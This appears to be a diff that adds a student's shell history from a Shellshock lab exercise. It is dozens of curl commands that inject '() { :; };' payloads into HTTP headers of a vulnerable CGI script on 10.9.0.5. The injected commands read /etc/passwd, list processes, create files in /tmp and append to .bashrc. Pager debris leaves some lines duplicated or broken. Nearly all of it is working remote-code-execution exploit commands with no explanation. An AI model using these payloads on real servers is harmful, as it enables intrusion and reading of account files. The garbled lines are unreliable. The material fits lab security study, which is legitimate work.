@@ -1,0 +1,122 @@
+ 143  curl http://10.9.0.5/cgi-bin/test.cgi
+  191  curl -H '$(curl -H "user-agent: () { :; }; echo;echo inside the nested curl;echo; /bin/bash -c 'ps -efu $(id -u);echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgi)'
+  195  curl -H 'Content-type: text/plain; echo; /bin/ls -l' http://10.9.0.5/cgi-bin/vul.cgi
+  196  curl -H 'Content-type: text/plain; echo; /bin/bash_shellshock -v' http://10.9.0.5/cgi-bin/vul.cgi
+  198  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  199  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'grep $(whoami) /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  200  curl -H "Content-type: text/plain; echo; /bin/bash -c '/bin/ls -l'" http://10.9.0.5/cgi-bin/vul.cgi
+  201  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  202  curl -A "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  203  curl -A "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  204  curl -A "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" -v http://10.9.0.5/cgi-bin/vul.cgi
+                              o; echo; /bin/bash -c 'ps -ef'" -v http://10.9.0.5--More--(9%)
+...back 1 page
+  143  curl http://10.9.0.5/cgi-bin/test.cgi
+  191  curl -H '$(curl -H "user-agent: () { :; }; echo;echo inside the nested curl;echo; /bin/bash -c 'ps -efu $(id -u);echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgi)'
+  195  curl -H 'Content-type: text/plain; echo; /bin/ls -l' http://10.9.0.5/cgi-bin/vul.cgi
+  196  curl -H 'Content-type: text/plain; echo; /bin/bash_shellshock -v' http://10.9.0.5/cgi-bin/vul.cgi
+  198  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  199  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'grep $(whoami) /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  200  curl -H "Content-type: text/plain; echo; /bin/bash -c '/bin/ls -l'" http://10.9.0.5/cgi-bin/vul.cgi
+  201  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  202  curl -A "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  203  curl -A "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  204  curl -A "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  205  curl -A "() { :; }; echo; echo; /bin/bash -c 'ps -ef'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  206  curl -H "Content-type: text/plain; echo; /bin/bash -c '/bin/ls -l'" http://10.9.0.5/cgi-bin/vul.cgi
+  207  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  208  curl -H "content-type: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  209  curl -H "Content-type: text/plain; () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  210  curl -H "Content-type: text/plain; echo; () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  211  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  212  curl -H "user-agent: FIREFOX() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  213  curl -H "user-agent: FIREFOX () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  214  curl -H "user-agent: () { :; }; echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  215  curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'cat /etc/passwd'" http://10.9.0.5/cgi-bin/vul.cgi
+  216  curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'cat /etc/passwd'; echo 'Shellshock Exploited'" http://10.9.0.5/cgi-bin/vul.cgi
+&& echo shellshock exploited'" http://10.9.0.5/cgi-bin/vul.cgi 'cat /etc/passwd --More--(19%)
+  218  curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'cat /etc/passwd;echo;echo shellshock exploited'" http://10.9.0.5/cgi-bin/vul.cgi
+  219  curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'cat /etc/passwd;echo;echo shellshock exploited;echo'" http://10.9.0.5/cgi-bin/vul.cgi
+  220  curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'cat /etc/passwd;echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgi
+  221  curl -H "nonexistent_header: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  222  curl -H "Content-Type: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  223  curl -H "Content-Type: text/plain; () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  224  curl -H "GET: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  225  curl -H "POST: ''() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  226  curl -H "POST: echo;() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  227  curl -H "POST: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  228  curl -H "POST: () { :; }; echo; echo; /bin/bash -c 'cat /bin/ls -lahX'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  229  curl -H "POST: () { :; }; echo; echo; /bin/bash -c 'cat /bin/ls -lah'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  230  curl -H "POST: () { :; }; echo; echo; /bin/bash -c '/bin/ls -lahX'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  231  curl -H "POST: () { :; }; echo; echo; /bin/bash -c '/bin/ls -lahi'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  232  curl -H "POST: () { :; }; echo; echo; /bin/bash -c '/bin/ls -tlahi'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  233  curl -H "POST: () { :; }; echo; echo; /bin/bash -c '/bin/ls -tahi'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  234  curl -X "() { :; }; echo; echo; /bin/bash -c '/bin/ls -tahi'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  235  curl -X POST "() { :; }; echo; echo; /bin/bash -c '/bin/ls -tahi'" -v http://10.9.0.5/cgi-bin/vul.cgi
+  236  curl -X POST "() { :; }; echo; echo; /bin/bash -c '/bin/ls -tahi'" -H 'Content-Type: text/plain' -v http://10.9.0.5/cgi-bin/vul.cgi
+  237  curl -H "POST: () { :; }; echo; echo; /bin/bash -c '/bin/ls -tahi'" -vvv http://10.9.0.5/cgi-bin/vul.cgi
+  238  curl -H "" -X POST  "() { :; }; echo; echo; /bin/bash -c '/bin/ls -tahi'" -vvv http://10.9.0.5/cgi-bin/vul.cgi
+  239  curl -X POST  "() { :; }; echo; echo; /bin/bash -c '/bin/ls -tahi'" -vvv http://10.9.0.5/cgi-bin/vul.cgi
+echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgiwd;--More--(39%)
+  261  curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'ps -u $(id -ru);echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgi
+  262  curl -H "user-agent: () { :; }; echo;echo --- running processes by user ---;echo; /bin/bash -c 'ps -u $(id -ru);echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgi
+  263  curl -H "user-agent: () { :; }; echo;echo --- running processes by the exploited user ---;echo; /bin/bash -c 'ps -u $(id -ru);echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgi
+  264  curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'ps -u $(id -ru);echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgi
+  265  curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'ps -u $(id );echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgi
+  266  curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'id;echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgi
+  267  curl -H "user-agent: () { :; }; echo;echo current process ;echo; /bin/bash -c 'id;echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgi
+  268  curl -H "user-agent: () { :; }; echo;echo current process is running under;echo; /bin/bash -c 'id;echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgi
+ho'" http://10.9.0.5/cgi-bin/vul.cgi}; echo;echo current process is running under;echo; /bin/bash -c 'ps -efu $(id -u);echo;echo --- shellshock exploited ---;ec--More--(50%)
+  270  curl --help
+  271  curl -H "user-agent: () { :; }; echo;echo current process is running under;echo; /bin/bash -c 'ps -efu $(id -u);echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgi --trace debug.exploited__psef.txt
+  273  curl -H '$(curl -H "user-agent: () { :; }; echo;echo inside the nested curl;echo; /bin/bash -c 'ps -efu $(id -u);echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgi)'
+  274  curl -H '' 10.9.0.5/cgi-bin/vul.cgi
+  275  curl -H "curl -H 'Content-Type: random'" 10.9.0.5/cgi-bin/vul.cgi
+  276  curl -H "curl -H 'Content-Type: random'" 10.9.0.5/cgi-bin/vul.cgi -v
+  277  curl -H "$(curl -H 'Content-Type: random')" 10.9.0.5/cgi-bin/vul.cgi -v
+  278  curl -H "$(curl -H '')" 10.9.0.5/cgi-bin/vul.cgi -v
+  279  curl -H "$(curl -H '')" 10.9.0.5/cgi-bin/vul.cgi -v
+  280  curl -H "$(curl -H 'hello')" 10.9.0.5/cgi-bin/vul.cgi -v
+  281  curl -H "$(curl -H '() { :; }; echo;echo inside the nested curl;echo; /bin/bash -c 'ps -efu $(id -u)')" 10.9.0.5/cgi-bin/vul.cgi -v
+  283  curl -v -H 'Content-Type: $(curl -H "user-agent: () { :; }; echo;echo inside the nested curl;echo; /bin/bash -c 'mkdir -p $(id -u) /tmp/success' 10.9.0.5/cgi-bin/vul.cgi
+  284  curl -v -H 'Content-Type: $(/bin/sh -c 'mkdir /tmp/hello')' 10.9.0.5/cgi-bin/vul.cgi
+bin/vul.cgi  v -H "Content-Type: $(/bin/sh -c 'mkdir /tmp/hello')" 10.9.0.5/cgi---More--(60%)
+  287  curl -v -H "Content-Type: $(/bin/sh -c 'mkdir /tmp/hello && id -u')" 10.9.0.5/cgi-bin/vul.cgi
+  288  curl -v -H "Content-Type: $(/bin/sh -c 'mkdir /tmp/hello && echo $(id -u) >> /tmp/id_number')" 10.9.0.5/cgi-bin/vul.cgi
+  289  curl --help
+  293  curl -v -H "Content-Type: $(/bin/sh -c 'mkdir /tmp/hello2')" 10.9.0.5/cgi-bin/vul.cgi --trace debug.shell-expansion.create-dir.txt
+  295  curl -v -H "Content-Type: $(/bin/sh -c 'mkdir /tmp/hello2')" 10.9.0.5/cgi-bin/vul.cgi
+  296  curl -v --trace writeout.txt -H "Content-Type: $(/bin/sh -c 'mkdir /tmp/hello2')" 10.9.0.5/cgi-bin/vul.cgi
+  298  curl -v -H "Content-Type: $(() { :; }; echo;echo inside the nested curl;echo; /bin/sh -c 'ps -efu $(id -u) >> /tmp/process.txt)" 10.9.0.5/cgi-bin/vul.cgi --trace debug.shell-expansion.create-file2.txt
+
+  320  curl --help | grep port
+  321  curl -P 443 10.9.0.5/cgi-bin/vul.cgi
+  322  curl -P 443 10.9.0.5/cgi-bin/vul.cgi --trace port.443.txt
+  324  curl -v -P 443 10.9.0.5/cgi-bin/vul.cgi --trace port.443.txt
+  326  curl -v -P 443 10.9.0.5/cgi-bin/vul.cgi -H '$(ls -lah)' --trace port.443.txt
+  328  curl -v -P 443 10.9.0.5/cgi-bin/vul.cgi -H '$(ls -lah >> test_file.txt)' --trace port.443.txt
+  331  curl -v -P 443 10.9.0.5/cgi-bin/vul.cgi -H '$(ls -lah >> /home/seed/test_file.txt)' --trace port.443.txt
+
+  362  curl -v -H "Content-Type: $(export covertfile='() { :; }'; touch /tmp/covert.bmp;\
+  363  curl -v -H "Content-Type: $(export covertfile='() { :; }'; touch /tmp/covert.bmp;
+ert.bmp;     v -H "Content-Type: $(export covertfile='() { :; }'; touch /tmp/cov--More--(79%)
+  366  curl -v -H "Content-Type: $(echo 'hello')" 10.9.0.5:6666
+  369  curl -v -H "Content-Type: $(() { :; }; echo;echo inside the nested curl;echo; /bin/sh -c 'ps -efu $(id -u) >> /tmp/process.txt)" 10.9.0.5:6666
+  370  curl -H "$(curl -H '')" 10.9.0.5:6666 -v
+  371  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'grep $(whoami) /etc/passwd'" http://10.9.0.5:6666/cgi-bin/vul.cgi
+  372  curl -v -H 'Content-Type: $(curl -H "user-agent: () { :; }; echo;echo inside the nested curl;echo; /bin/bash -c 'mkdir -p $(id -u) /tmp/success' 10.9.0.5/cgi-bin/vul.cgi
+  373  curl -H '$(curl -H "user-agent: () { :; }; echo;echo inside the nested curl;echo; /bin/bash -c 'ps -efu $(id -u);echo;echo --- shellshock exploited ---;echo'" http://10.9.0.5/cgi-bin/vul.cgi)'
+  374  curl -H "$(curl -H 'user-agent: () { :; }; echo;echo inside the nested curl;echo; /bin/bash -c 'ps -efu $(id -u);echo;echo --- shellshock exploited ---;echo'' http://10.9.0.5/cgi-bin/vul.cgi)"
+  376  curl -v -H "Content-Type: $(/bin/sh -c 'mkdir /tmp/hello66')" 10.9.0.5/cgi-bin/vul.cgi
+  377  curl -v -H "Content-Type: $(/bin/sh -c 'mkdir /tmp/hello66')" 10.9.0.5:6666/cgi-bin/vul.cgi
+  378  curl -v -H "Content-Type: $(/bin/sh -c  $(echo "hello world, helloworld" >> $HOME/.bashrc) )" 10.9.0.5:6666/cgi-bin/vul.cgi
+>> $HOME/.bashrc) )" 10.9.0.5/cgi-bin/vul.cgi  $(echo "hello world, helloworld" --More--(88%)
+  383  curl -H "$(curl -H 'user-agent: () { :; }; echo;echo inside the nested curl;echo; /bin/bash -c 'ps -efu $(id -u);echo;echo --- shellshock exploited ---;echo'' http://10.9.0.5/cgi-bin/vul.cgi)"
+  385  curl -v -H "Content-Type: $(/bin/sh -c 'strace -fpT mkdir /tmp/hello66')" 10.9.0.5/cgi-bin/vul.cgi --trace debug.shell-command-substitution.trace.txt
+  386  curl -v -H "Content-Type: $(/bin/sh -c 'strace -fp mkdir /tmp/hello66')" 10.9.0.5/cgi-bin/vul.cgi --trace debug.shell-command-substitution.trace.txt
+  387  curl -v -H "Content-Type: $(/bin/sh -c 'strace -f mkdir /tmp/hello66')" 10.9.0.5/cgi-bin/vul.cgi --trace debug.shell-command-substitution.trace.txt
+  388  curl -v -H "Content-Type: $(/bin/sh -c 'strace -f mkdir /tmp/hello666')" 10.9.0.5/cgi-bin/vul.cgi --trace debug.shell-command-substitution.trace.txt
+  391  curl -v -H "Content-Type: $(strace -f /bin/sh -c 'mkdir /tmp/hello666')" 10.9.0.5/cgi-bin/vul.cgi --trace debug.shell-command-substitution.trace.txt
+  392  curl -v -H "Content-Type: $(strace -fc /bin/sh -c 'mkdir /tmp/hello666')" 10.9.0.5/cgi-bin/vul.cgi --trace debug.shell-command-substitution.trace.txt
+  394  curl -v -H "Content-Type: $(strace -fc -o strace_output.txt /bin/sh -c 'mkdir /tmp/hello666')" 10.9.0.5/cgi-bin/vul.cgi --trace debug.shell-command-substitution.trace.txt
+  396  curl -v -H "Content-Type: $(strace -f -o strace_output.txt /bin/sh -c 'mkdir /tmp/hello666')" 10.9.0.5/cgi-bin/vul.cgi --trace debug.shell-command-substitution.trace.txt
